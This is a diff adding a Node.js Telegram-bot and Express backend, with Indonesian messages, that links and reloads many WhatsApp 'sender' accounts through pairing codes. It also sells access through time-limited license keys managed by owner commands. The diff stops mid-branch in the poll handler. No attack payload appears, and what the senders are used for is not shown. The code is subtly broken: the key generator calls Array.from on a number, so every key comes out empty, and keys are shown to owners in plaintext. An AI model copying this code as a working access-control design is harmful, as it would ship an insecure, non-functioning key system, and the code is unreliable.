@@ -1,0 +1,3355 @@
+const { Telegraf, Markup } = require("telegraf");
+const fs = require("fs");
+const pino = require("pino");
+const crypto = require("crypto");
+const chalk = require("chalk");
+const path = require("path");
+const { getUsers, saveUsers, loadAkses, saveAkses, isOwner, isAuthorized } = require("./user-manager.js");
+const { activeSessions, savePersistentSessions, cleanupExpiredSessions, generateSessionId } = require("./session-store.js");
+const tools = require("./tools.js");
+const { tokens, owners, ipvps, port } = require("./database/config.js");
+const axios = require("axios");
+const express = require("express");
+const fetch = require("node-fetch");
+const bodyParser = require("body-parser");
+const cookieParser = require("cookie-parser");
+const { spawn } = require("child_process");
+const cors = require("cors");
+const { getCountryCode, validatePhoneNumber } = require("./helpers/phone-helper.js");
+
+const bot = new Telegraf(tokens);
+const app = express();
+const userSessions = new Map();
+const activeConnections = new Map();
+const sessionsFile = "./sessions.json";
+const authDir = "./auth";
+const userJsonPath = path.join(__dirname, "./database/user.json");
+const userSessionsPath = path.join(__dirname, "user_sessions.json");
+const eventStreams = new Map();
+let lastExecutionTime = null;
+let currentMenu;
+
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function generateRandomKey(length = 4) {
+  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+  const { length: len } = { length };
+  return Array.from(len, () => chars.charAt(Math.floor(Math.random() * chars.length))).join("");
+}
+
+function parseDuration(durationStr) {
+  const match = durationStr.match(/^(\d+)([dh])$/);
+  if (!match) {
+    return null;
+  }
+  const value = parseInt(match[1]);
+  const unit = match[2];
+  if (unit === "d") {
+    return value * 86400000;
+  } else {
+    return value * 3600000;
+  }
+}
+
+function loadUserSessions() {
+  try {
+    if (!fs.existsSync(userSessionsPath)) {
+      const empty = {};
+      fs.writeFileSync(userSessionsPath, JSON.stringify(empty, null, 2));
+      return empty;
+    }
+    const content = fs.readFileSync(userSessionsPath, "utf8").trim();
+    if (!content) {
+      return {};
+    }
+    let sessions;
+    try {
+      sessions = JSON.parse(content);
+    } catch (parseError) {
+      console.error("[SESSION] JSON parse error:", parseError.message);
+      const backupFile = userSessionsPath + ".backup-" + Date.now();
+      fs.copyFileSync(userSessionsPath, backupFile);
+      sessions = {};
+      fs.writeFileSync(userSessionsPath, JSON.stringify(sessions, null, 2));
+    }
+    if (typeof sessions !== "object" || sessions === null) {
+      sessions = {};
+      fs.writeFileSync(userSessionsPath, JSON.stringify(sessions, null, 2));
+    }
+    let cleanedCount = 0;
+    Object.keys(sessions).forEach(username => {
+      if (!Array.isArray(sessions[username])) {
+        delete sessions[username];
+        cleanedCount++;
+      } else {
+        const originalLength = sessions[username].length;
+        sessions[username] = sessions[username].filter(num => typeof num === "string" && num.length >= 7 && num.length <= 15 && /^\d+$/.test(num));
+        cleanedCount += originalLength - sessions[username].length;
+        const uniqueNumbers = [...new Set(sessions[username])];
+        cleanedCount += sessions[username].length - uniqueNumbers.length;
+        sessions[username] = uniqueNumbers;
+      }
+    });
+    Object.keys(sessions).forEach(username => {
+      if (sessions[username].length === 0) {
+        delete sessions[username];
+        cleanedCount++;
+      }
+    });
+    const totalSenders = Object.values(sessions).reduce((sum, arr) => sum + arr.length, 0);
+    if (cleanedCount > 0) {
+      saveUserSessions(sessions);
+    }
+    return sessions;
+  } catch (error) {
+    console.error("[SESSION] ❌ Error loading user_sessions.json:", error);
+    return {};
+  }
+}
+
+function saveUserSessions(sessions) {
+  try {
+    if (typeof sessions !== "object" || sessions === null) {
+      console.error("[SESSION] Invalid data for saving, resetting...");
+      sessions = {};
+    }
+    Object.keys(sessions).forEach(username => {
+      if (!Array.isArray(sessions[username]) || sessions[username].length === 0) {
+        delete sessions[username];
+      } else {
+        sessions[username] = sessions[username].filter(num => typeof num === "string" && num.length >= 7 && num.length <= 15 && /^\d+$/.test(num));
+        sessions[username] = [...new Set(sessions[username])];
+      }
+    });
+    const totalSenders = Object.values(sessions).reduce((sum, arr) => sum + arr.length, 0);
+    fs.writeFileSync(userSessionsPath, JSON.stringify(sessions, null, 2));
+    return true;
+  } catch (error) {
+    console.error("❌ Gagal menyimpan user_sessions.json:", error);
+    return false;
+  }
+}
+
+const getUserAuthDir = (username, deviceId) => {
+  const userDir = path.join(authDir, "users", username);
+  const deviceDir = path.join(userDir, "device" + deviceId);
+  if (!fs.existsSync(deviceDir)) {
+    fs.mkdirSync(deviceDir, { recursive: true });
+  }
+  return deviceDir;
+};
+
+function sendEventToUser(username, data) {
+  const stream = eventStreams.get(username);
+  if (stream) {
+    try {
+      stream.write("data: " + JSON.stringify(data) + "\n\n");
+    } catch (error) {
+      console.error("[EVENT] Error sending event to " + username + ":", error.message);
+      eventStreams.delete(username);
+    }
+  }
+}
+
+let isHealthCheckRunning = false;
+function healthCheck() {
+  if (isHealthCheckRunning) {
+    return;
+  }
+  const activeCount = activeConnections.size;
+  const allSessions = loadUserSessions();
+  const totalRegistered = Object.values(allSessions).reduce((sum, arr) => sum + arr.length, 0);
+  console.log(chalk.bold("\n📊  [HEALTH CHECK] Active: " + activeCount + "/" + totalRegistered + " sessions"));
+  if (totalRegistered > 0 && activeCount < totalRegistered) {
+    const missing = totalRegistered - activeCount;
+    console.log(chalk.yellow("   ⚠️ Missing " + missing + " sessions, attempting to reload..."));
+    isHealthCheckRunning = true;
+    reloadAllSessions();
+    setTimeout(() => {
+      isHealthCheckRunning = false;
+      console.log(chalk.green.bold("🔄 [HEALTH CHECK] Reload cycle completed"));
+    }, 30000);
+  } else if (activeCount > 0) {
+    console.log(chalk.green("   ✅ All sessions are active"));
+  }
+}
+
+setInterval(healthCheck, 120000);
+setTimeout(healthCheck, 30000);
+
+let reloadAttempts = 0;
+const maxReloadAttempts = 3;
+async function startupReload() {
+  reloadAttempts++;
+  console.log(chalk.yellow.bold("\n[STARTUP] 🔄 Reload attempt " + reloadAttempts + "/" + maxReloadAttempts));
+  const allSessions = loadUserSessions();
+  if (Object.keys(allSessions).length === 0) {
+    console.log(chalk.yellow("[STARTUP] 💡 No sessions to reload - waiting for users to add senders"));
+    return;
+  }
+  await reloadAllSessions();
+  setTimeout(() => {
+    const currentActive = activeConnections.size;
+    console.log(chalk.blue("\n[STARTUP] 📊 Current active sessions: " + currentActive));
+    if (currentActive === 0 && reloadAttempts < maxReloadAttempts) {
+      console.log(chalk.yellow.bold("[STARTUP] 🔄 No active sessions, retrying... (" + reloadAttempts + "/" + maxReloadAttempts + ")"));
+      setTimeout(() => {
+        startupReload();
+      }, 10000);
+    } else if (currentActive === 0) {
+      console.log(chalk.red("[STARTUP] ❌ All reload attempts failed - manual reconnection required"));
+    } else {
+      console.log(chalk.green.bold("[STARTUP] ✅ SUCCESS: " + currentActive + " sessions active"));
+    }
+  }, 30000);
+}
+
+async function reloadAllSessions() {
+  const allSessions = loadUserSessions();
+  if (Object.keys(allSessions).length === 0) {
+    console.log(chalk.yellow.bold("[RELOAD] 💡 No user sessions found"));
+    return;
+  }
+  let totalProcessed = 0;
+  let successCount = 0;
+  let failedCount = 0;
+  for (const [username, numbers] of Object.entries(allSessions)) {
+    for (const number of numbers) {
+      totalProcessed++;
+      if (activeConnections.has(number)) {
+        continue;
+      }
+      const deviceDir = getUserAuthDir(username, number);
+      const credsPath = path.join(deviceDir, "creds.json");
+      if (fs.existsSync(credsPath)) {
+        console.log(chalk.cyan.bold("[RELOAD] 🔗 Connecting " + number + "..."));
+        try {
+          const sock = await Promise.race([connectToWhatsAppUser(username, number, deviceDir), new Promise((_, reject) => setTimeout(() => reject(new Error("Connection timeout")), 60000))]);
+          if (sock) {
+            successCount++;
+            console.log(chalk.green.bold("[RELOAD] ✅ " + number + " connected successfully"));
+          }
+        } catch (error) {
+          failedCount++;
+          console.log(chalk.red.bold("[RELOAD] ❌ " + number + " failed: " + error.message));
+        }
+        await new Promise(resolve => setTimeout(resolve, 2000));
+      } else {
+        console.log(chalk.yellow.bold("[RELOAD] ⏭️ " + number + " - No session files, skipping"));
+        failedCount++;
+      }
+    }
+  }
+}
+
+setTimeout(() => {
+  console.log(chalk.blue.bold("\n" + "=".repeat(50)));
+  console.log(chalk.cyan.bold("🚀  STARTING AUTO-RELOAD OF WHATSAPP SESSIONS"));
+  console.log(chalk.blue.bold("=".repeat(50)));
+  startupReload();
+}, 5000);
+
+async function autoReloadAllSessions() {
+  console.log(chalk.cyan.bold("\n🔧 [STARTUP] Starting auto-reload of all sessions..."));
+  const allSessions = loadUserSessions();
+  const totalSenders = Object.values(allSessions).reduce((sum, arr) => sum + arr.length, 0);
+  if (totalSenders === 0) {
+    return;
+  }
+  let success = 0;
+  let failed = 0;
+  for (const [username, numbers] of Object.entries(allSessions)) {
+    for (const number of numbers) {
+      try {
+        const deviceDir = getUserAuthDir(username, number);
+        const credsPath = path.join(deviceDir, "creds.json");
+        if (fs.existsSync(credsPath)) {
+          setTimeout(async () => {
+            try {
+              const sock = await connectToWhatsAppUser(username, number, deviceDir);
+              if (sock) {
+                success++;
+                console.log(chalk.green("   ✅ Success: " + number));
+                activeConnections.set(number, sock);
+              }
+            } catch (error) {
+              failed++;
+              console.log(chalk.yellow("   ⚠️ Warning: " + number + " - " + error.message));
+            }
+          }, Math.random() * 5000);
+        } else {
+          console.log(chalk.gray("   ⏭️ Skipping " + number + " - No creds.json found"));
+          failed++;
+        }
+      } catch (error) {
+        console.error("   ❌ Error reloading " + number + ":", error.message);
+        failed++;
+      }
+    }
+  }
+  setTimeout(() => {
+    console.log(chalk.bold("\n📊 [STARTUP] RELOAD SUMMARY:"));
+    console.log(chalk.green("   ✅ Successfully reloaded: " + success));
+    console.log(chalk.yellow("   ⚠️ Failed to reload: " + failed));
+    console.log(chalk.blue("   🔗 Total active sessions: " + activeConnections.size));
+  }, 15000);
+}
+
+setTimeout(() => {
+  autoReloadAllSessions();
+}, 8000);
+
+const { 
+  default: makeWASocket, 
+  makeCacheableSignalKeyStore, 
+  useMultiFileAuthState, 
+  DisconnectReason, 
+  fetchLatestWaWebVersion 
+} = require("@whiskeysockets/baileys");
+
+const connectToWhatsAppUser = async (username, number, deviceDir) => {
+  try {
+    sendEventToUser(username, {
+      type: "status",
+      message: "Memulai koneksi WhatsApp...",
+      number: number,
+      status: "connecting"
+    });
+    const { state, saveCreds } = await useMultiFileAuthState(deviceDir);
+    const { version } = await fetchLatestWaWebVersion();
+    const sock = makeWASocket({
+      auth: state,
+      printQRInTerminal: false,
+      logger: pino({ level: "silent" }),
+      version: version,
+      defaultQueryTimeoutMs: 60000,
+      connectTimeoutMs: 60000,
+      keepAliveIntervalMs: 10000,
+      generateHighQualityLinkPreview: true,
+      syncFullHistory: false,
+      retryRequestDelayMs: 2000,
+      fireInitQueries: true,
+      markOnlineOnConnect: false
+    });
+    return new Promise((resolve, reject) => {
+      let isConnected = false;
+      let pairingRequested = false;
+      let timeoutTimer;
+      let reconnectAttempts = 0;
+      const maxReconnectAttempts = 3;
+      const clearTimer = () => {
+        if (timeoutTimer) {
+          clearTimeout(timeoutTimer);
+        }
+      };
+      sock.ev.on("connection.update", async update => {
+        const { connection, lastDisconnect, qr } = update;
+        console.log(chalk.blue.bold("🔄 Connection update:", connection));
+        if (connection === "close") {
+          const statusCode = lastDisconnect?.error?.output?.statusCode;
+          console.log(chalk.red.bold(" 📴 Connection closed, status: " + statusCode));
+          activeConnections.delete(number);
+          if (statusCode === DisconnectReason.loggedOut) {
+            console.log("[" + username + "] 📵 Device logged out, cleaning session...");
+            sendEventToUser(username, {
+              type: "error",
+              message: "Device logged out, silakan scan ulang",
+              number: number,
+              status: "logged_out"
+            });
+            if (fs.existsSync(deviceDir)) {
+              try {
+                fs.rmSync(deviceDir, { recursive: true, force: true });
+              } catch (error) {
+                console.error("[" + username + "] ❌ Failed to delete session folder:", error.message);
+              }
+            }
+            const allSessions = loadUserSessions();
+            if (allSessions[username]) {
+              allSessions[username] = allSessions[username].filter(num => num !== number);
+              saveUserSessions(allSessions);
+            }
+            clearTimer();
+            reject(new Error("Device logged out, please pairing again"));
+            return;
+          }
+          if (statusCode === DisconnectReason.restartRequired || statusCode === DisconnectReason.timedOut || statusCode === DisconnectReason.connectionLost) {
+            if (reconnectAttempts < maxReconnectAttempts) {
+              reconnectAttempts++;
+              const reconnectData = {
+                type: "status",
+                message: "Mencoba menyambung kembali... (" + reconnectAttempts + "/" + maxReconnectAttempts + ")",
+                number: number,
+                status: "reconnecting"
+              };
+              sendEventToUser(username, reconnectData);
+              console.log(chalk.green.bold("🔄 Reconnect attempt " + reconnectAttempts + " for " + number));
+              setTimeout(async () => {
+                try {
+                  const newSock = await connectToWhatsAppUser(username, number, deviceDir);
+                  resolve(newSock);
+                } catch (error) {
+                  reject(error);
+                }
+              }, 5000);
+              return;
+            } else {
+              sendEventToUser(username, {
+                type: "error",
+                message: "Gagal reconnect setelah beberapa percobaan",
+                number: number,
+                status: "failed"
+              });
+            }
+          }
+          if (!isConnected) {
+            clearTimer();
+            sendEventToUser(username, {
+              type: "error",
+              message: "Koneksi gagal dengan status: " + statusCode,
+              number: number,
+              status: "failed"
+            });
+            reject(new Error("Connection failed with status: " + statusCode));
+          }
+        }
+        if (connection === "open") {
+          console.log(chalk.green.bold("✅ CONNECTED SUCCESSFULLY!"));
+          isConnected = true;
+          clearTimer();
+          activeConnections.set(number, sock);
+          const allSessions = loadUserSessions();
+          if (!allSessions[username]) {
+            allSessions[username] = [];
+          }
+          if (!allSessions[username].includes(number)) {
+            allSessions[username].push(number);
+            saveUserSessions(allSessions);
+          }
+          sendEventToUser(username, {
+            type: "success",
+            message: "Berhasil terhubung dengan WhatsApp!",
+            number: number,
+            status: "connected"
+          });
+          resolve(sock);
+        }
+        if (connection === "connecting") {
+          sendEventToUser(username, {
+            type: "status",
+            message: "Menghubungkan ke WhatsApp...",
+            number: number,
+            status: "connecting"
+          });
+          if (!fs.existsSync(deviceDir + "/creds.json") && !pairingRequested) {
+            pairingRequested = true;
+            setTimeout(async () => {
+              try {
+                console.log(chalk.green("[" + username + "] 📞 Requesting pairing code for " + number + "..."));
+                sendEventToUser(username, {
+                  type: "status",
+                  message: "Meminta kode pairing...",
+                  number: number,
+                  status: "requesting_code"
+                });
+                const pairingCode = await sock.requestPairingCode(number);
+                const formattedCode = pairingCode.match(/.{1,4}/g)?.join("-") || pairingCode;
+                const pairingData = {
+                  type: "pairing_code",
+                  message: "Kode Pairing Berhasil Digenerate!",
+                  number: number,
+                  code: formattedCode,
+                  status: "waiting_pairing",
+                  instructions: ["1. Buka WhatsApp di HP Anda", "2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device", "3. Masukkan kode pairing berikut:", "KODE: " + formattedCode, "4. Kode berlaku 30 detik!"]
+                };
+                sendEventToUser(username, pairingData);
+                const currentSessions = loadUserSessions();
+                if (!currentSessions[username]) {
+                  currentSessions[username] = [];
+                }
+                if (!currentSessions[username].includes(number)) {
+                  currentSessions[username].push(number);
+                  saveUserSessions(currentSessions);
+                }
+              } catch (error) {
+                console.error("[" + username + "] ❌ Error requesting pairing code:", error.message);
+                sendEventToUser(username, {
+                  type: "error",
+                  message: "Gagal meminta kode pairing: " + error.message,
+                  number: number,
+                  status: "code_error"
+                });
+              }
+            }, 3000);
+          }
+        }
+        if (qr) {
+          sendEventToUser(username, {
+            type: "qr",
+            message: "Scan QR Code berikut:",
+            number: number,
+            qr: qr,
+            status: "waiting_qr"
+          });
+          const qrSessions = loadUserSessions();
+          if (!qrSessions[username]) {
+            qrSessions[username] = [];
+          }
+          if (!qrSessions[username].includes(number)) {
+            qrSessions[username].push(number);
+            saveUserSessions(qrSessions);
+          }
+        }
+      });
+      sock.ev.on("creds.update", saveCreds);
+      sock.ev.on("connection.close", () => {
+        console.log(chalk.green("[" + username + "] 🔌 Connection closed event for " + number));
+        activeConnections.delete(number);
+      });
+      timeoutTimer = setTimeout(() => {
+        if (!isConnected) {
+          console.log(chalk.red("[" + username + "] ⏱️ Connection timeout for " + number));
+          sendEventToUser(username, {
+            type: "error",
+            message: "Timeout - Tidak bisa menyelesaikan koneksi dalam 180 detik",
+            number: number,
+            status: "timeout"
+          });
+          activeConnections.delete(number);
+          clearTimer();
+          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
+        }
+      }, 180000);
+    });
+  } catch (error) {
+    console.error("[" + username + "] ❌ Error in connectToWhatsAppUser:", error);
+    activeConnections.delete(number);
+    sendEventToUser(username, {
+      type: "error",
+      message: "Error: " + error.message,
+      number: number,
+      status: "error"
+    });
+    throw error;
+  }
+};
+
+const startPolls = new Map();
+const ckeyPolls = new Map();
+
+bot.command("start", async ctx => {
+  const userName = ctx.from.username || ctx.from.first_name || "Unknown";
+  const startImage = require("./database/config.js").botSettings.startImage;
+  try {
+    await ctx.deleteMessage();
+  } catch (error) {}
+  await ctx.replyWithPhoto(startImage, {
+    caption: require("./database/config.js").messages.getStartCaption(userName, require("./database/config.js").botSettings),
+    parse_mode: "HTML",
+    ...Markup.inlineKeyboard([require("./database/config.js").botSettings.buttons.map(btn => Markup.button.url(btn.text, btn.url))])
+  });
+  const pollMsg = await ctx.replyWithPoll(require("./database/config.js").botSettings.pollTitle, require("./database/config.js").botSettings.pollOptions, {
+    is_anonymous: false,
+    type: "regular",
+    allows_multiple_answers: false,
+    open_period: 60
+  });
+  const infoMsg = await ctx.reply("⏳ <b>Silakan pilih menu di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
+    parse_mode: "HTML"
+  });
+  startPolls.set(pollMsg.poll.id, {
+    adminId: ctx.from.id,
+    adminChatId: ctx.chat.id,
+    pollMessageId: pollMsg.message_id,
+    infoMessageId: infoMsg.message_id,
+    type: "start_menu",
+    timestamp: Date.now()
+  });
+  setTimeout(async () => {
+    const pollData = startPolls.get(pollMsg.poll.id);
+    if (pollData) {
+      try {
+        await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.pollMessageId);
+        await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.infoMessageId);
+      } catch (error) {}
+      startPolls.delete(pollMsg.poll.id);
+    }
+  }, 60000);
+});
+
+bot.command("ckey", async ctx => {
+  const adminId = ctx.from.id.toString();
+  if (!isOwner(adminId)) {
+    return ctx.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
+  }
+  const args = ctx.message.text.split(" ")[1];
+  if (!args || !args.includes(",")) {
+    return ctx.reply("✗ Format: /ckey <username>,<durasi>,<telegram_id>\n\nContoh:\n• /ckey user1,30d,123456789\n• /ckey user2,7d,987654321\n\nDurasi: 7d, 30d, 365d\nNote: Role akan dipilih via polling");
+  }
+  const parts = args.split(",");
+  const username = parts[0].trim();
+  const duration = parts[1].trim();
+  const telegramId = parts[2] ? parts[2].trim() : "";
+  if (!telegramId || !/^\d+$/.test(telegramId)) {
+    return ctx.reply("✗ Telegram ID harus berupa angka!");
+  }
+  const durationMs = parseDuration(duration);
+  if (!durationMs) {
+    return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 30d / 365d");
+  }
+  const key = generateRandomKey(6);
+  const expired = Date.now() + durationMs;
+  try {
+    await ctx.deleteMessage();
+  } catch (error) {}
+  const pollMsg = await ctx.replyWithPoll("🔑 Pilih Role untuk " + username, ["👑 Owner", "🔧 Admin", "👤 User", "❌ Cancel"], {
+    is_anonymous: false,
+    type: "regular",
+    allows_multiple_answers: false,
+    open_period: 60
+  });
+  const infoMsg = await ctx.reply("⏳ <b>Silakan pilih role di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
+    parse_mode: "HTML"
+  });
+  ckeyPolls.set(pollMsg.poll.id, {
+    adminId: adminId,
+    adminChatId: ctx.chat.id,
+    pollMessageId: pollMsg.message_id,
+    infoMessageId: infoMsg.message_id,
+    username: username,
+    key: key,
+    expired: expired,
+    telegramId: telegramId,
+    durationStr: duration,
+    type: "ckey",
+    timestamp: Date.now()
+  });
+  setTimeout(async () => {
+    const pollData = ckeyPolls.get(pollMsg.poll.id);
+    if (pollData) {
+      try {
+        await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.pollMessageId);
+        await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.infoMessageId);
+      } catch (error) {}
+      try {
+        await ctx.telegram.sendMessage(pollData.adminId, "⏰ <b>Polling expired!</b>\n" + ("Pembuatan key untuk " + pollData.username + " dibatalkan.\n") + "Silakan ulangi dengan /ckey", {
+          parse_mode: "HTML"
+        });
+      } catch (error) {}
+      ckeyPolls.delete(pollMsg.poll.id);
+    }
+  }, 300000);
+});
+
+bot.command("listkey", async ctx => {
+  const userId = ctx.from.id.toString();
+  const users = getUsers();
+  if (!isOwner(userId)) {
+    return ctx.reply("[ ❗ ] - Hanya owner yang bisa mengakses command ini.");
+  }
+  if (users.length === 0) {
+    return ctx.reply("💢 Belum ada key yang dibuat.");
+  }
+  try {
+    await ctx.deleteMessage();
+  } catch (error) {}
+  const pollOptions = users.slice(0, 10).map((user, index) => index + 1 + ". " + user.username + " (" + (user.role || "user") + ")");
+  pollOptions.push("📋 Lihat Semua");
+  pollOptions.push("❌ Batal");
+  const pollMsg = await ctx.replyWithPoll("👥 Pilih User untuk Detail", pollOptions, {
+    is_anonymous: false,
+    type: "regular",
+    allows_multiple_answers: false,
+    open_period: 60
+  });
+  const infoMsg = await ctx.reply("⏳ <b>Silakan pilih user di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
+    parse_mode: "HTML"
+  });
+  ckeyPolls.set(pollMsg.poll.id, {
+    adminId: userId,
+    adminChatId: ctx.chat.id,
+    pollMessageId: pollMsg.message_id,
+    infoMessageId: infoMsg.message_id,
+    type: "listkey",
+    users: users,
+    timestamp: Date.now()
+  });
+  setTimeout(async () => {
+    const pollData = ckeyPolls.get(pollMsg.poll.id);
+    if (pollData && pollData.type === "listkey") {
+      try {
+        await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.pollMessageId);
+        await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.infoMessageId);
+      } catch (error) {}
+      ckeyPolls.delete(pollMsg.poll.id);
+    }
+  }, 300000);
+});
+
+bot.command("delkey", async ctx => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId) && !isAuthorized(userId)) {
+    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner/Admin.");
+  }
+  const username = ctx.message.text.split(" ")[1];
+  if (!username) {
+    const users = getUsers();
+    if (users.length === 0) {
+      return ctx.reply("💢 Tidak ada user yang bisa dihapus.");
+    }
+    try {
+      await ctx.deleteMessage();
+    } catch (error) {}
+    const pollOptions = users.slice(0, 10).map((user, index) => index + 1 + ". " + user.username + " (" + (user.role || "user") + ")");
+    pollOptions.push("❌ Batal");
+    const pollMsg = await ctx.replyWithPoll("🗑️ Pilih User untuk Dihapus", pollOptions, {
+      is_anonymous: false,
+      type: "regular",
+      allows_multiple_answers: false,
+      open_period: 60
+    });
+    const infoMsg = await ctx.reply("⏳ <b>Silakan pilih user di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
+      parse_mode: "HTML"
+    });
+    ckeyPolls.set(pollMsg.poll.id, {
+      adminId: userId,
+      adminChatId: ctx.chat.id,
+      pollMessageId: pollMsg.message_id,
+      infoMessageId: infoMsg.message_id,
+      type: "delkey",
+      users: users,
+      timestamp: Date.now()
+    });
+    setTimeout(async () => {
+      const pollData = ckeyPolls.get(pollMsg.poll.id);
+      if (pollData && pollData.type === "delkey") {
+        try {
+          await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.pollMessageId);
+          await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.infoMessageId);
+        } catch (error) {}
+        ckeyPolls.delete(pollMsg.poll.id);
+      }
+    }, 300000);
+  } else {
+    const targetUsername = username;
+    const users = getUsers();
+    const userIndex = users.findIndex(user => user.username === targetUsername);
+    if (userIndex === -1) {
+      return ctx.reply("✗ User `" + targetUsername + "` tidak ditemukan.", {
+        parse_mode: "HTML"
+      });
+    }
+    users.splice(userIndex, 1);
+    saveUsers(users);
+    ctx.reply("✅ <b>User berhasil dihapus</b>\n\n" + ("<b>Username:</b> <code>" + targetUsername + "</code>"), {
+      parse_mode: "HTML"
+    });
+  }
+});
+
+bot.on("poll_answer", async ctx => {
+  try {
+    const pollAnswer = ctx.pollAnswer;
+    const pollId = pollAnswer.poll_id;
+    const userId = pollAnswer.user.id;
+    const optionIds = pollAnswer.option_ids;
+    if (!optionIds || optionIds.length === 0) {
+      return;
+    }
+    const selectedOption = optionIds[0];
+    const startPollData = startPolls.get(pollId);
+    if (startPollData) {
+      try {
+        await ctx.telegram.deleteMessage(startPollData.adminChatId, startPollData.pollMessageId);
+        await ctx.telegram.deleteMessage(startPollData.adminChatId, startPollData.infoMessageId);
+      } catch (error) {
+        console.log("Gagal hapus polling start:", error.message);
+      }
+      let responseText = "";
+      if (selectedOption === 0) {
+        responseText = "<blockquote>⚙️ SETTINGS MENU</blockquote>\n\n<b>Command untuk pengaturan user:</b>\n\n<code>/ckey username,durasi,telegram_id</code>\n<code>/listkey</code>\n<code>/delkey username</code>\n<code>/myrole</code>\n\n<i>Example: /ckey user1,30d,123456789</i>";
+      } else if (selectedOption === 1) {
+        const isOwnerUser = isOwner(userId.toString());
+        if (!isOwnerUser) {
+          responseText = "⚠️ <b>ACCESS DENIED</b>\nHanya owner yang bisa mengakses menu ini!";
+        } else {
+          responseText = "<blockquote>👑 OWNER MENU</blockquote>\n\n<b>Command khusus untuk owner:</b>\n\n<code>/connect</code> - Hubungkan WhatsApp\n<code>/listsender</code> - List semua sender\n<code>/delsender</code> - Hapus sender\n<code>/addowner user_id</code> - Tambah owner\n<code>/delowner user_id</code> - Hapus owner\n\n<i>Example: /addowner 123456789</i>";
+        }
+      } else if (selectedOption === 2) {
+        const allSessions = loadUserSessions();
+        const activeCount = activeConnections.size;
+        const totalUsers = Object.keys(allSessions).length;
+        let totalSenders = 0;
+        Object.values(allSessions).forEach(arr => {
+          totalSenders += arr.length;
+        });
+        responseText = "<blockquote>📊 SESSION STATUS</blockquote>\n\n";
+        responseText += "<b>✅ Active Sessions:</b> " + activeCount + "\n";
+        responseText += "<b>👥 Registered Users:</b> " + totalUsers + "\n";
+        responseText += "<b>📞 Total Senders:</b> " + totalSenders + "\n\n";
+        if (totalUsers > 0) {
+          responseText += "<b>📋 User Details:</b>\n";
+          let count = 1;
+          Object.entries(allSessions).forEach(([username, numbers]) => {
+            if (count <= 5) {
+              const activeForUser = numbers.filter(num => activeConnections.has(num)).length;
+              responseText += "\n<b>" + count + ". " + username + ":</b> " + activeForUser + "/" + numbers.length + " aktif";
+              count++;
+            }
+          });
+          if (totalUsers > 5) {
+            responseText += "\n\n<i>...dan " + (totalUsers - 5) + " user lainnya</i>";
+          }
+        }
+      } else if (selectedOption === 3) {
+        responseText = "❌ <b>Polling dibatalkan</b>\n\nGunakan /start untuk memulai kembali.";
+      }
+      if (responseText) {
+        await ctx.telegram.sendMessage(userId, responseText, {
+          parse_mode: "HTML"
+        });
+      }
+      startPolls.delete(pollId);
+      return;
+    }
+    const ckeyPollData = ckeyPolls.get(pollId);
+    if (ckeyPollData) {
+      try {
+        await ctx.telegram.deleteMessage(ckeyPollData.adminChatId, ckeyPollData.pollMessageId);
+        await ctx.telegram.deleteMessage(ckeyPollData.adminChatId, ckeyPollData.infoMessageId);
+      } catch (error) {
+        console.log("Gagal hapus polling ckey:", error.message);
+      }
+      if (ckeyPollData.type === "listkey") {
+        if (selectedOption === ckeyPollData.users.length) {
+          let allUsersText = "<b>📋 DAFTAR SEMUA USER</b>\n\n";
+          ckeyPollData.users.forEach((user, index) => {
+            const expiredDate = new Date(user.expired).toLocaleString("id-ID", {
+              timeZone: "Asia/Jakarta",
+              year: "numeric",
+              month: "2-digit",
+              day: "2-digit",
+              hour: "2-digit",
+              minute: "2-digit"
+            });
+            const status = Date.now() > user.expired ? "❌ EXPIRED" : "✅ AKTIF";
+            allUsersText += "<b>" + (index + 1) + ". " + user.username + "</b>\n" + ("Key: <code>" + user.key + "</code>\n") + ("Role: " + (user.role || "user") + "\n") + ("Telegram: " + (user.telegram_id || "-") + "\n") + ("Expired: " + expiredDate + "\n") + ("Status: " + status + "\n\n");
+          });
+          await ctx.telegram.sendMessage(ckeyPollData.adminId, allUsersText, {
+            parse_mode: "HTML"
+          });
+        } else if (selectedOption === ckeyPollData.users.length + 1) {
+          await ctx.telegram.sendMessage(ckeyPollData.adminId, "❌ <b>Dibatalkan</b>", {
+            parse_mode: "HTML"
+          });
+        } else {
+          const selectedIndex = selectedOption;
+          if (selectedIndex >= 0 && selectedIndex < ckeyPollData.users.length) {
+            const selectedUser = ckeyPollData.users[selectedIndex];
+            const expiredDate = new Date(selectedUser.expired).toLocaleString("id-ID", {
+              timeZone: "Asia/Jakarta",
+              year: "numeric",
+              month: "2-digit",
+              day: "2-digit",
+              hour: "2-digit",
+              minute: "2-digit"
+            });
+            const status = Date.now() > selectedUser.expired ? "❌ EXPIRED" : "✅ AKTIF";
+            const detailText = "<b>👤 DETAIL USER</b>\n\n" + ("<b>Username:</b> <code>" + selectedUser.username + "</code>\n") + ("<b>Key:</b> <code>" + selectedUser.key + "</code>\n") + ("<b>Role:</b> " + (selectedUser.role || "user") + "\n") + ("<b>Telegram ID:</b> " + (selectedUser.telegram_id || "-") + "\n") + ("<b>Expired:</b> " + expiredDate + " WIB\n") + ("<b>Status:</b> " + status + "\n") + ("<b>Created:</b> " + (selectedUser.created_at ? new Date(selectedUser.created_at).toLocaleDateString("id-ID") : "-"));
+            await ctx.telegram.sendMessage(ckeyPollData.adminId, detailText, {
+              parse_mode: "HTML"
+            });
+          }
+        }
+        ckeyPolls.delete(pollId);
+        return;
+      }
+      if (ckeyPollData.type === "delkey") {
